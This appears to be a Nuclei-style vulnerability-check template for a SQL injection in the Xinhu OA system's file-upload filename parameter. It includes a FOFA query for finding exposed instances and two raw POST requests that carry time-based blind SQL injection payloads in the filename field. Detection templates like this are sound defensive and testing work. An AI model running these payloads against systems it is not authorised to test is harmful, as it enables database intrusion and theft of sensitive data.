id: xinhu-oa-filename-sql
info:
  name: "信呼-OA 系统文件名参数 SQL 注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="信呼-OA系统"


    目标系统在文件名参数解析过程中存在SQL语法注入缺陷，攻击者可构造特制请求载荷实现数据库查询操控，导致敏感数据泄露。该漏洞影响范围可通过上述FOFA条件定位，攻击链利用需结合具体接口逻辑实现。
  tags: 信呼OA
http:
- raw:
  - |
    POST /index.php?a=upfile&n=uploaw|api&d=task HTTP/1.1
    Host: {{Hostname}}
    X-Requested-With: XMLHttpRequest
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryitXXXXXXXX

    ------WebKitFormBoundaryitXXXXXXXX
    Content-Disposition: form-data; name="file"; filename="a',web=(select if(1=1,sleep(5),0))--,png"

    NdayTest
    ------WebKitFormBoundaryitXXXXXXXX--
  - |
    POST /index.php?a=upfile&n=uploaw|api&d=task HTTP/1.1
    Host: {{Hostname}}
    X-Requested-With: XMLHttpRequest
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryitXXXXXXXX

    ------WebKitFormBoundaryitXXXXXXXX
    Content-Disposition: form-data; name="file"; filename="a',web=(select if(1=1,sleep(8),0))--,png"

    NdayTest
    ------WebKitFormBoundaryitXXXXXXXX--
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
